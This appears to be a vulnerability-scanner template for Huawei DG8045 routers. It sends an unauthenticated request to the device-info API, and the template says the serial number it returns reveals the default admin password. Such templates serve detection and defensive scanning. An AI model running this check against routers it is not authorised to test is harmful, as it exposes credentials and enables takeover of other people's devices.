id: huawei-dg8045-auth-bypass
info:
  author: geeknik
  description: The default password of this router is the last 8 characters of the
    device's serial number which exist in the back of the device and via the web app
    API as seen below.
  name: Huawei dg8045 - Authentication Bypass
  reference: https://www.exploit-db.com/exploits/50059
  severity: high
  tags: huawei,dg8045,auth,bypass
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    type: word
    words:
    - DeviceName
    - SerialNumber
    - VER.A
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/system/deviceinfo'
